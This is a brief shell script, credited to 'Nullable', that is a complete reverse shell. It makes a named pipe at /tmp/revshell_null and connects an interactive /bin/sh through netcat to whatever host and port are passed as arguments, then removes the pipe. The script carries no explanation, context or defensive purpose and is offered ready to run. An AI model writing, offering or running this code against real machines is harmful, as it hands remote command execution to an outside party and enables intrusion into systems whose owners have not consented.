#! /bin/sh 

# author: Nullable

main () {
	f_name="/tmp/revshell_null"
	if test -f $f_name; then rm $f_name; fi
	mkfifo $f_name
	cat $f_name | /bin/sh -i 2>&1 | nc $1 $2 > $f_name
	if test -f $f_name; then rm $f_name; fi
}

main $@
